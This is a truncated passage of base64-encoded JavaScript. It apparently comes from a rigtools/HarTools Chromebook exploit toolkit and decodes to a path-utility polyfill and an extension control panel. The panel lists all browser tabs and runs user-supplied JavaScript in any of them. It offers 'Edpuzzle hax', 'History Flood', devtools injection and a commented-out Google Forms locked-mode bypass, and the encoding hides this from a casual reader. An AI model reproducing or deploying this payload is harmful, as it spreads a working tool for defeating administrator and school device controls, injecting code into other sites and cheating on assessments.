wID0gMDsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgfQogICAgICAgICAgICB2YXIgZnJvbUNvZGUgPSBmcm9tLmNoYXJDb2RlQXQoZnJvbVN0YXJ0ICsgaSk7CiAgICAgICAgICAgIHZhciB0b0NvZGUgPSB0by5jaGFyQ29kZUF0KHRvU3RhcnQgKyBpKTsKICAgICAgICAgICAgaWYgKGZyb21Db2RlICE9PSB0b0NvZGUpCiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgZWxzZSBpZiAoZnJvbUNvZGUgPT09IDQ3KQogICAgICAgICAgICAgICAgbGFzdENvbW1vblNlcCA9IGk7CiAgICAgICAgfQogICAgICAgIHZhciBvdXQgPSAnJzsKCiAgICAgICAgZm9yIChpID0gZnJvbVN0YXJ0ICsgbGFzdENvbW1vblNlcCArIDE7IGkgPD0gZnJvbUVuZDsgKytpKSB7CiAgICAgICAgICAgIGlmIChpID09PSBmcm9tRW5kIHx8IGZyb20uY2hhckNvZGVBdChpKSA9PT0gNDcpIHsKICAgICAgICAgICAgICAgIGlmIChvdXQubGVuZ3RoID09PSAwKQogICAgICAgICAgICAgICAgICAgIG91dCArPSAnLi4nOwogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIG91dCArPSAnLy4uJzsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgaWYgKG91dC5sZW5ndGggPiAwKQogICAgICAgICAgICByZXR1cm4gb3V0ICsgdG8uc2xpY2UodG9TdGFydCArIGxhc3RDb21tb25TZXApOwogICAgICAgIGVsc2UgewogICAgICAgICAgICB0b1N0YXJ0ICs9IGxhc3RDb21tb25TZXA7CiAgICAgICAgICAgIGlmICh0by5jaGFyQ29kZUF0KHRvU3RhcnQpID09PSA0NykKICAgICAgICAgICAgICAgICsrdG9TdGFydDsKICAgICAgICAgICAgcmV0dXJuIHRvLnNsaWNlKHRvU3RhcnQpOwogICAgICAgIH0KICAgIH0sCiAgICBfbWFrZUxvbmc6IGZ1bmN0aW9uIF9tYWtlTG9uZyhwYXRoKSB7CiAgICAgICAgcmV0dXJuIHBhdGg7CiAgICB9LAogICAgZGlybmFtZTogZnVuY3Rpb24gZGlybmFtZShwYXRoKSB7CiAgICAgICAgYXNzZXJ0UGF0aChwYXRoKTsKICAgICAgICBpZiAocGF0aC5sZW5ndGggPT09IDApIHJldHVybiAnLic7CiAgICAgICAgdmFyIGNvZGUgPSBwYXRoLmNoYXJDb2RlQXQoMCk7CiAgICAgICAgdmFyIGhhc1Jvb3QgPSBjb2RlID09PSA0NzsKICAgICAgICB2YXIgZW5kID0gLTE7CiAgICAgICAgdmFyIG1hdGNoZWRTbGFzaCA9IHRydWU7CiAgICAgICAgZm9yICh2YXIgaSA9IHBhdGgubGVuZ3RoIC0gMTsgaSA+PSAxOyAtLWkpIHsKICAgICAgICAgICAgY29kZSA9IHBhdGguY2hhckNvZGVBdChpKTsKICAgICAgICAgICAgaWYgKGNvZGUgPT09IDQ3KSB7CiAgICAgICAgICAgICAgICBpZiAoIW1hdGNoZWRTbGFzaCkgewogICAgICAgICAgICAgICAgICAgIGVuZCA9IGk7CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gZWxzZSB7CgogICAgICAgICAgICAgICAgbWF0Y2hlZFNsYXNoID0gZmFsc2U7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKGVuZCA9PT0gLTEpIHJldHVybiBoYXNSb290ID8gJy8nIDogJy4nOwogICAgICAgIGlmIChoYXNSb290ICYmIGVuZCA9PT0gMSkgcmV0dXJuICcvLyc7CiAgICAgICAgcmV0dXJuIHBhdGguc2xpY2UoMCwgZW5kKTsKICAgIH0sCiAgICBiYXNlbmFtZTogZnVuY3Rpb24gYmFzZW5hbWUocGF0aCwgZXh0KSB7CiAgICAgICAgaWYgKGV4dCAhPT0gdW5kZWZpbmVkICYmIHR5cGVvZiBleHQgIT09ICdzdHJpbmcnKSB0aHJvdyBuZXcgVHlwZUVycm9yKCciZXh0IiBhcmd1bWVudCBtdXN0IGJlIGEgc3RyaW5nJyk7CgogICAgICAgIHZhciBzdGFydCA9IDA7CiAgICAgICAgdmFyIGVuZCA9IC0xOwogICAgICAgIHZhciBtYXRjaGVkU2xhc2ggPSB0cnVlOwogICAgICAgIHZhciBpOwogICAgICAgIGlmIChleHQgIT09IHVuZGVmaW5lZCAmJiBleHQubGVuZ3RoID4gMCAmJiBleHQubGVuZ3RoIDw9IHBhdGgubGVuZ3RoKSB7CiAgICAgICAgICAgIGlmIChleHQubGVuZ3RoID09PSBwYXRoLmxlbmd0aCAmJiBleHQgPT09IHBhdGgpIHJldHVybiAnJzsKICAgICAgICAgICAgdmFyIGV4dElkeCA9IGV4dC5sZW5ndGggLSAxOwogICAgICAgICAgICB2YXIgZmlyc3ROb25TbGFzaEVuZCA9IC0xOwogICAgICAgICAgICBmb3IgKGkgPSBwYXRoLmxlbmd0aCAtIDE7IGkgPj0gMDsgLS1pKSB7CiAgICAgICAgICAgICAgICB2YXIgY29kZSA9IHBhdGguY2hhckNvZGVBdChpKTsKICAgICAgICAgICAgICAgIGlmIChjb2RlID09PSA0NykgewoKICAgICAgICAgICAgICAgICAgICBpZiAoIW1hdGNoZWRTbGFzaCkgewogICAgICAgICAgICAgICAgICAgICAgICBzdGFydCA9IGkgKyAxOwogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGlmIChmaXJzdE5vblNsYXNoRW5kID09PSAtMSkgewoKICAgICAgICAgICAgICAgICAgICAgICAgbWF0Y2hlZFNsYXNoID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgIGZpcnN0Tm9uU2xhc2hFbmQgPSBpICsgMTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKGV4dElkeCA+PSAwKSB7CgogICAgICAgICAgICAgICAgICAgICAgICBpZiAoY29kZSA9PT0gZXh0LmNoYXJDb2RlQXQoZXh0SWR4KSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKC0tZXh0SWR4ID09PSAtMSkgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQgPSBpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4dElkeCA9IC0xOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kID0gZmlyc3ROb25TbGFzaEVuZDsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoc3RhcnQgPT09IGVuZCkgZW5kID0gZmlyc3ROb25TbGFzaEVuZDsKICAgICAgICAgICAgZWxzZSBpZiAoZW5kID09PSAtMSkgZW5kID0gcGF0aC5sZW5ndGg7CiAgICAgICAgICAgIHJldHVybiBwYXRoLnNsaWNlKHN0YXJ0LCBlbmQpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGZvciAoaSA9IHBhdGgubGVuZ3RoIC0gMTsgaSA+PSAwOyAtLWkpIHsKICAgICAgICAgICAgICAgIGlmIChwYXRoLmNoYXJDb2RlQXQoaSkgPT09IDQ3KSB7CgogICAgICAgICAgICAgICAgICAgIGlmICghbWF0Y2hlZFNsYXNoKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHN0YXJ0ID0gaSArIDE7CiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoZW5kID09PSAtMSkgewoKICAgICAgICAgICAgICAgICAgICBtYXRjaGVkU2xhc2ggPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBlbmQgPSBpICsgMTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoZW5kID09PSAtMSkgcmV0dXJuICcnOwogICAgICAgICAgICByZXR1cm4gcGF0aC5zbGljZShzdGFydCwgZW5kKTsKICAgICAgICB9CiAgICB9LAogICAgZXh0bmFtZTogZnVuY3Rpb24gZXh0bmFtZShwYXRoKSB7CiAgICAgICAgYXNzZXJ0UGF0aChwYXRoKTsKICAgICAgICB2YXIgc3RhcnREb3QgPSAtMTsKICAgICAgICB2YXIgc3RhcnRQYXJ0ID0gMDsKICAgICAgICB2YXIgZW5kID0gLTE7CiAgICAgICAgdmFyIG1hdGNoZWRTbGFzaCA9IHRydWU7CgogICAgICAgIHZhciBwcmVEb3RTdGF0ZSA9IDA7CiAgICAgICAgZm9yICh2YXIgaSA9IHBhdGgubGVuZ3RoIC0gMTsgaSA+PSAwOyAtLWkpIHsKICAgICAgICAgICAgdmFyIGNvZGUgPSBwYXRoLmNoYXJDb2RlQXQoaSk7CiAgICAgICAgICAgIGlmIChjb2RlID09PSA0NykgewoKICAgICAgICAgICAgICAgIGlmICghbWF0Y2hlZFNsYXNoKSB7CiAgICAgICAgICAgICAgICAgICAgc3RhcnRQYXJ0ID0gaSArIDE7CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoZW5kID09PSAtMSkgewoKICAgICAgICAgICAgICAgIG1hdGNoZWRTbGFzaCA9IGZhbHNlOwogICAgICAgICAgICAgICAgZW5kID0gaSArIDE7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKGNvZGUgPT09IDQ2KSB7CgogICAgICAgICAgICAgICAgaWYgKHN0YXJ0RG90ID09PSAtMSkKICAgICAgICAgICAgICAgICAgICBzdGFydERvdCA9IGk7CiAgICAgICAgICAgICAgICBlbHNlIGlmIChwcmVEb3RTdGF0ZSAhPT0gMSkKICAgICAgICAgICAgICAgICAgICBwcmVEb3RTdGF0ZSA9IDE7CiAgICAgICAgICAgIH0gZWxzZSBpZiAoc3RhcnREb3QgIT09IC0xKSB7CgogICAgICAgICAgICAgICAgcHJlRG90U3RhdGUgPSAtMTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZiAoc3RhcnREb3QgPT09IC0xIHx8IGVuZCA9PT0gLTEgfHwKCiAgICAgICAgICAgIHByZURvdFN0YXRlID09PSAwIHx8CgogICAgICAgICAgICBwcmVEb3RTdGF0ZSA9PT0gMSAmJiBzdGFydERvdCA9PT0gZW5kIC0gMSAmJiBzdGFydERvdCA9PT0gc3RhcnRQYXJ0ICsgMSkgewogICAgICAgICAgICByZXR1cm4gJyc7CiAgICAgICAgfQogICAgICAgIHJldHVybiBwYXRoLnNsaWNlKHN0YXJ0RG90LCBlbmQpOwogICAgfSwKICAgIGZvcm1hdDogZnVuY3Rpb24gZm9ybWF0KHBhdGhPYmplY3QpIHsKICAgICAgICBpZiAocGF0aE9iamVjdCA9PT0gbnVsbCB8fCB0eXBlb2YgcGF0aE9iamVjdCAhPT0gJ29iamVjdCcpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IFR5cGVFcnJvcignVGhlICJwYXRoT2JqZWN0IiBhcmd1bWVudCBtdXN0IGJlIG9mIHR5cGUgT2JqZWN0LiBSZWNlaXZlZCB0eXBlICcgKyB0eXBlb2YgcGF0aE9iamVjdCk7CiAgICAgICAgfQogICAgICAgIHJldHVybiBfZm9ybWF0KCcvJywgcGF0aE9iamVjdCk7CiAgICB9LAogICAgcGFyc2U6IGZ1bmN0aW9uIHBhcnNlKHBhdGgpIHsKICAgICAgICBhc3NlcnRQYXRoKHBhdGgpOwogICAgICAgIHZhciByZXQgPSB7CiAgICAgICAgICAgIHJvb3Q6ICcnLAogICAgICAgICAgICBkaXI6ICcnLAogICAgICAgICAgICBiYXNlOiAnJywKICAgICAgICAgICAgZXh0OiAnJywKICAgICAgICAgICAgbmFtZTogJycKICAgICAgICB9OwogICAgICAgIGlmIChwYXRoLmxlbmd0aCA9PT0gMCkgcmV0dXJuIHJldDsKICAgICAgICB2YXIgY29kZSA9IHBhdGguY2hhckNvZGVBdCgwKTsKICAgICAgICB2YXIgaXNBYnNvbHV0ZSA9IGNvZGUgPT09IDQ3OwogICAgICAgIHZhciBzdGFydDsKICAgICAgICBpZiAoaXNBYnNvbHV0ZSkgewogICAgICAgICAgICByZXQucm9vdCA9ICcvJzsKICAgICAgICAgICAgc3RhcnQgPSAxOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHN0YXJ0ID0gMDsKICAgICAgICB9CiAgICAgICAgdmFyIHN0YXJ0RG90ID0gLTE7CiAgICAgICAgdmFyIHN0YXJ0UGFydCA9IDA7CiAgICAgICAgdmFyIGVuZCA9IC0xOwogICAgICAgIHZhciBtYXRjaGVkU2xhc2ggPSB0cnVlOwogICAgICAgIHZhciBpID0gcGF0aC5sZW5ndGggLSAxOwoKICAgICAgICB2YXIgcHJlRG90U3RhdGUgPSAwOwoKICAgICAgICBmb3IgKDsgaSA+PSBzdGFydDsgLS1pKSB7CiAgICAgICAgICAgIGNvZGUgPSBwYXRoLmNoYXJDb2RlQXQoaSk7CiAgICAgICAgICAgIGlmIChjb2RlID09PSA0NykgewoKICAgICAgICAgICAgICAgIGlmICghbWF0Y2hlZFNsYXNoKSB7CiAgICAgICAgICAgICAgICAgICAgc3RhcnRQYXJ0ID0gaSArIDE7CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoZW5kID09PSAtMSkgewoKICAgICAgICAgICAgICAgIG1hdGNoZWRTbGFzaCA9IGZhbHNlOwogICAgICAgICAgICAgICAgZW5kID0gaSArIDE7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKGNvZGUgPT09IDQ2KSB7CgogICAgICAgICAgICAgICAgaWYgKHN0YXJ0RG90ID09PSAtMSkgc3RhcnREb3QgPSBpOwogICAgICAgICAgICAgICAgZWxzZSBpZiAocHJlRG90U3RhdGUgIT09IDEpIHByZURvdFN0YXRlID0gMTsKICAgICAgICAgICAgfSBlbHNlIGlmIChzdGFydERvdCAhPT0gLTEpIHsKCiAgICAgICAgICAgICAgICBwcmVEb3RTdGF0ZSA9IC0xOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmIChzdGFydERvdCA9PT0gLTEgfHwgZW5kID09PSAtMSB8fAoKICAgICAgICAgICAgcHJlRG90U3RhdGUgPT09IDAgfHwKCiAgICAgICAgICAgIHByZURvdFN0YXRlID09PSAxICYmIHN0YXJ0RG90ID09PSBlbmQgLSAxICYmIHN0YXJ0RG90ID09PSBzdGFydFBhcnQgKyAxKSB7CiAgICAgICAgICAgIGlmIChlbmQgIT09IC0xKSB7CiAgICAgICAgICAgICAgICBpZiAoc3RhcnRQYXJ0ID09PSAwICYmIGlzQWJzb2x1dGUpIHJldC5iYXNlID0gcmV0Lm5hbWUgPSBwYXRoLnNsaWNlKDEsIGVuZCk7CiAgICAgICAgICAgICAgICBlbHNlIHJldC5iYXNlID0gcmV0Lm5hbWUgPSBwYXRoLnNsaWNlKHN0YXJ0UGFydCwgZW5kKTsKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGlmIChzdGFydFBhcnQgPT09IDAgJiYgaXNBYnNvbHV0ZSkgewogICAgICAgICAgICAgICAgcmV0Lm5hbWUgPSBwYXRoLnNsaWNlKDEsIHN0YXJ0RG90KTsKICAgICAgICAgICAgICAgIHJldC5iYXNlID0gcGF0aC5zbGljZSgxLCBlbmQpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgcmV0Lm5hbWUgPSBwYXRoLnNsaWNlKHN0YXJ0UGFydCwgc3RhcnREb3QpOwogICAgICAgICAgICAgICAgcmV0LmJhc2UgPSBwYXRoLnNsaWNlKHN0YXJ0UGFydCwgZW5kKTsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXQuZXh0ID0gcGF0aC5zbGljZShzdGFydERvdCwgZW5kKTsKICAgICAgICB9CiAgICAgICAgaWYgKHN0YXJ0UGFydCA+IDApIHJldC5kaXIgPSBwYXRoLnNsaWNlKDAsIHN0YXJ0UGFydCAtIDEpOwogICAgICAgIGVsc2UgaWYgKGlzQWJzb2x1dGUpIHJldC5kaXIgPSAnLyc7CiAgICAgICAgcmV0dXJuIHJldDsKICAgIH0sCiAgICBzZXA6ICcvJywKICAgIGRlbGltaXRlcjogJzonLAogICAgd2luMzI6IG51bGwsCiAgICBwb3NpeDogbnVsbAp9Owpjb25zdCBzbGlkZXMgPSBbXTsKbGV0IGFjdGl2ZVNsaWRlSWR4ID0gMDsKY29uc3QgaGFuZGxlQ2FsbGJhY2tzXyA9IFtdOwpjb25zdCBXQUlUX0ZPUl9GSU5JU0ggPSAxOwpyZXF1ZXN0QW5pbWF0aW9uRnJhbWUoZnVuY3Rpb24gYSh0KSB7CiAgICBmb3IgKGNvbnN0IGNiIG9mIGhhbmRsZUNhbGxiYWNrc18pIHsKICAgICAgICBsZXQgbTsKICAgICAgICBpZiAoKG0gPSBjYi5mLmFwcGx5KG51bGwsIFt0IC0gY2IudF0pKSkgewogICAgICAgICAgICBpZiAobSA9PT0gMSkgewogICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgaGFuZGxlQ2FsbGJhY2tzXy5zcGxpY2UoaGFuZGxlQ2FsbGJhY2tzXy5pbmRleE9mKGNiKSwgMSk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICByZXF1ZXN0QW5pbWF0aW9uRnJhbWUoYSk7Cn0pOwpjb25zdCBoYW5kbGVJbkFuaW1hdGlvbkZyYW1lID0gKGNiLCB0aGl6ID0gbnVsbCwgYXJncyA9IFtdKSA9PiB7CiAgICBoYW5kbGVDYWxsYmFja3NfLnB1c2goewogICAgICAgIGY6IGNiLAogICAgICAgIHQ6IHBlcmZvcm1hbmNlLm5vdygpLAogICAgfSk7Cn07CgpjbGFzcyBEZWZhdWx0RXh0ZW5zaW9uQ2FwYWJpbGl0aWVzIHsKICAgIHN0YXRpYyB0ZW1wbGF0ZSA9IGAKICA8dGl0bGU+VW50aXRsZWQgZG9jdW1lbnQ8L3RpdGxlPgogIDxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iaW1hZ2UveC1pY29uIiBocmVmPSJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY3Jvc3NqYmx5L0hhclRvb2xzLXJpZ3Rvb2xzMTI4cGx1cy9yZWZzL2hlYWRzL21haW4vZG9jcy5pY28iPgogIDxkaXYgaWQ9ImV4dF9kZWZhdWx0Ij4KICAgIDxkaXYgaWQ9ImRlZmF1bHRfZXh0ZW5zaW9uX2NhcGFiaWxpdGllcyI+CiAgICAgIDxkaXYgY2xhc3M9ImhlYWRlciI+CiAgICAgICAgPGltZyBzcmM9Imh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jcm9zc2pibHkvSGFyVG9vbHMtcmlndG9vbHMxMjhwbHVzL3JlZnMvaGVhZHMvbWFpbi9oYXJ0b29scy5naWYiIGFsdD0iSGFyVG9vbHMgTG9nbyIgY2xhc3M9ImxvZ28iIC8+CiAgICAgICAgPGgxPiBEZWZhdWx0IEV4dGVuc2lvbiBDYXBhYmlsaXRpZXMgPC9oMT4KICAgICAgPC9kaXY+CiAgICAgIDxkaXYgaWQ9InRhYnMtYnV0dG9ucyI+CiAgICAgICAgPHA+T24gdGFiIHVwZGF0ZTwvcD4KICAgICAgICA8ZGl2IGlkPSJ0b2dnbGVhYmxlLWJ1dHRvbnMiPiAKCQk8d2hpdGVidXR0b25zPgogICAgICAgICAgPGJ1dHRvbiBpZD0iZXJ1ZGEiPkVydWRhPC9idXR0b24+CiAgICAgICAgICA8YnV0dG9uIGlkPSJjaGlpIj5DaGlpPC9idXR0b24+CiAgICAgICAgICA8YnV0dG9uIGlkPSJhZGJsb2NrIj5BZGJsb2NrPC9idXR0b24+CiAgICAgICAgICA8YnV0dG9uIGlkPSJlZHB1enpsZSI+RWRwdXp6bGUgaGF4PC9idXR0b24+CiAgICAgICAgICA8IS0tIDxidXR0b24gaWQ9Imdsb2NrZWQiPkdmb3JtcyBMb2NrZWQgTW9kZSBieXBhc3M8L2J1dHRvbj4gLS0+CgkJPC93aGl0ZWJ1dHRvbnM+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgICA8ZGl2IGlkPSJvdGhlci1idXR0b25zIj4KICAgICAgICA8cD5PdGhlciBzY3JpcHRzPC9wPgoJCTx3aGl0ZWJ1dHRvbnM+CiAgICAgICAgPGJ1dHRvbiBpZD0ic3dhbXAiPlN3YW1wPC9idXR0b24+CiAgICAgICAgPGJ1dHRvbiBpZD0idXBkYXRlIj5VcGRhdGUgSGFydG9vbHM8L2J1dHRvbj4KICAgICAgICA8YnV0dG9uIGlkPSJxdWljay1ybXYtYmx0Ij5RdWljayBSZW1vdmUgQmxvYXQgKHVzZWQgdy8gZ2Zvcm1zIGV4dGVuKTwvYnV0dG9uPgogICAgICAgIDxidXR0b24gaWQ9ImhzdGZsZCI+SGlzdG9yeSBGbG9vZDwvYnV0dG9uPgoJCTwvd2hpdGVidXR0b25zPgogICAgICA8L2Rpdj4KICAgICAgPGgyPkV2YWx1YXRlIGNvZGU8L2gxPgogICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgICA8dGV4dGFyZWEgaWQ9ImNvZGUiIHBsYWNlaG9sZGVyPSJFbnRlciBKYXZhU2NyaXB0IHRvIGluamVjdCI+PC90ZXh0YXJlYT4KICAgICAgICA8L2Rpdj4KICAgICAgICA8YnV0dG9uIGlkPSJjb2RlLXJ1biI+UnVuPC9idXR0b24+CiAgICAgICAgPGRpdiBpZD0iY29kZS1vdXRwdXQiPjwvZGl2PgoKICAgIDwvZGl2PgogICAgPGRpdiBpZD0iZXh0ZW5zaW9uX3RhYnNfZGVmYXVsdCI+CiAgICAgIDxidXR0b24gaWQ9InRhYnJlbG9hZCI+UmVmcmVzaCBUYWJzPC9idXR0b24+CiAgICAgIDx1bD4KICAgICAgPC91bD4KICAgICAgPGlucHV0IGlkPSJUYWJVUkxJbnB1dCIvPiA8YnV0dG9uIGlkPSJUYWJVUkxTdWJtaXQiPkNyZWF0ZTwvYnV0dG9uPgogICAgPC9kaXY+CiAgPC9kaXY+CiAgYDsKICAgIHVwZGF0ZVRhYkxpc3QoKSB7CiAgICAgICAgaWYgKHRoaXMuZGlzYXJtZWQpIHsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KCiAgICAgICAgaWYgKHRoaXMudGFiTGlzdEluUHJvZ3Jlc3MpIHsKCiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CiAgICAgICAgdGhpcy50YWJMaXN0SW5Qcm9ncmVzcyA9IHRydWU7CgogICAgICAgIGNvbnN0IHRhYmxpc3QgPSBkb2N1bWVudC5ib2R5LnF1ZXJ5U2VsZWN0b3IoIiNleHRlbnNpb25fdGFic19kZWZhdWx0IHVsIik7CgogICAgICAgIHRhYmxpc3QuaW5uZXJIVE1MID0gIiI7CiAgICAgICAgY29uc3QgdGhpeiA9IHRoaXM7CiAgICAgICAgY2hyb21lLndpbmRvd3MuZ2V0QWxsKGZ1bmN0aW9uKHdpbikgewogICAgICAgICAgICB3aW4uZm9yRWFjaChmdW5jdGlvbih2KSB7CiAgICAgICAgICAgICAgICBjaHJvbWUudGFicy5xdWVyeSh7CiAgICAgICAgICAgICAgICAgICAgd2luZG93SWQ6IHYuaWQKICAgICAgICAgICAgICAgIH0sIGZ1bmN0aW9uKHRhYkluZm9zKSB7CiAgICAgICAgICAgICAgICAgICAgdGFiSW5mb3MuZm9yRWFjaChmdW5jdGlvbihpbmZvKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGRpdiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgICAgICAgICAgICAgICAgICAgICBkaXYuY2xhc3NOYW1lID0gInRhYmxpc3QtaXRlbSI7CiAgICAgICAgICAgICAgICAgICAgICAgIGRpdi5pbm5lckhUTUwgPSBgPGltZyAkewogICAgICAgICAgICAgIGNocm9tZS50YWJzICYmIChpbmZvLmZhdkljb25Vcmw/Lmxlbmd0aCA/PyAwKSA+IDAKICAgICAgICAgICAgICAgID8gYHNyYz0iJHtpbmZvLmZhdkljb25Vcmx9ImAKICAgICAgICAgICAgICAgIDogIiIKICAgICAgICAgICAgfS8+PHNwYW4gY2xhc3M9InRhYi1uYW1lIj4ke2luZm8udGl0bGV9IDxsaXRzdHVmZj4gJHtpbmZvLnVybH08bGl0c3R1ZmY+PC9zcGFuPmA7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjaHJvbWUuc2NyaXB0aW5nIHx8IGNocm9tZS50YWJzLmV4ZWN1dGVTY3JpcHQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHJ1bkJ1dHRvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImJ1dHRvbiIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgcnVuQnV0dG9uLnRleHRDb250ZW50ID0gIlJ1biI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBydW5CdXR0b24ub25jbGljayA9ICgpID0+IHJ1bkNvZGUodHJ1ZSwgaW5mby5pZCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaXYuYXBwZW5kQ2hpbGQocnVuQnV0dG9uKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgcHJldmlld0J1dHRvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImJ1dHRvbiIpOwogICAgICAgICAgICAgICAgICAgICAgICBwcmV2aWV3QnV0dG9uLnRleHRDb250ZW50ID0gIlByZXZpZXciOwoKICAgICAgICAgICAgICAgICAgICAgICAgcHJldmlld0J1dHRvbi5vbmNsaWNrID0gKCkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhpei5kaXNhcm0gPSB0cnVlOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRoaXoucHJldmlld2luZyA9IHRydWU7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLndpbmRvd3MudXBkYXRlKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGluZm8ud2luZG93SWQsIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9jdXNlZDogdHJ1ZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWUudGFicy51cGRhdGUoaW5mby5pZCwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYWN0aXZlOiB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aW5kb3cuY3VycmVudFRpbWVvdXQgPSBzZXRUaW1lb3V0KGZ1bmN0aW9uIG0oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJUaW1lb3V0KHdpbmRvdy5jdXJyZW50VGltZW91dCk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZS50YWJzLmdldEN1cnJlbnQoZnVuY3Rpb24odGFiKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZS53aW5kb3dzLnVwZGF0ZSgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhYi53aW5kb3dJZCwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvY3VzZWQ6IHRydWUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLnRhYnMudXBkYXRlKHRhYi5pZCwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhY3RpdmU6IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aGl6LmRpc2FybSA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRoaXoucHJldmlld2luZyA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI